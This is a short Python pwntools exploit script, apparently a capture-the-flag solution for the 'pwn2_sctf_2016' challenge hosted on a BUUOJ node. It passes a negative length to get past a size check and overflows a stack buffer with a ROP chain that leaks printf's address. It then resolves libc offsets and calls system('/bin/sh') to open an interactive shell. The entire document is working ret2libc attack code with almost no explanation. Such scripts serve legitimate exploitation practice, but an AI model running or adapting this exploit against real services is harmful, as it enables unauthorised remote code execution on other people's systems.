# coding:utf-8
from pwn import *
from LibcSearcher import *
import pwnlib
# context.log_level = "debug"
elf = ELF("./pwn2_sctf_2016")
# sh = process("./pwn2_sctf_2016")
sh = remote("node3.buuoj.cn",28151)
main = elf.symbols['main']
printf_plt = elf.plt['printf']
printf_got = elf.got['printf']
format_str = 0x080486F8
sh.recvuntil('read? ')
sh.sendline('-1')
sh.recvuntil('data!\n')
payload = 'a'*0x30 + p32(printf_plt)+p32(main)+p32(format_str)+p32(printf_got)
sh.sendline(payload)
#函数结束前的输出字符串
sh.recvuntil('said: ')
#rop执行后输出的字符串，其中有函数地址
sh.recvuntil('said: ')
printf_addr = u32(sh.recv(4))
libc = LibcSearcher('printf',printf_addr)
libc_base = printf_addr - libc.dump('printf')
system_addr = libc_base + libc.dump('system')
str_bin_sh = libc_base + libc.dump('str_bin_sh')
sh.sendlineafter("read? ","-1")
payload = 'a' * 0x30 + p32(system_addr) + p32(main) + p32(str_bin_sh)
sh.recvuntil("data!\n")
sh.sendline(payload)
sh.interactive()